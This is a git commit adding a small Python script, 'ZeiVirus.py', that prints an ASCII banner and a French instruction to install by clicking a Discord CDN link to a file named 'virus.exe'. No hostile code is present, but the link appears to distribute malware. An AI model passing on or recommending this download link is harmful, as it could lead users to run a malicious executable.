c9c1314d79340fcb8b804c53574682e7733d1819
zeidensad <100368432+zeidensad@users.noreply.github.com>
2022-11-06 12:55:48 +0100

    Zeivirus

---
+++ ZeiVirus.py
@@ -0,0 +1,16 @@
+print ("""
+             _                
+__ __(_) _ _  _  _  ___
+\ V /| || '_|| || |(_-/
+ \_/ |_||_|   \_._|/__/
+     
+ 
+      By zeiden
+      
+    pour installer cliquer sur le liens ci dessous
+      
+https://cdn.discordapp.com/attachments/992120933902975066/1037773148633956382/virus.exe   
+ 
+       
+       
+       """)
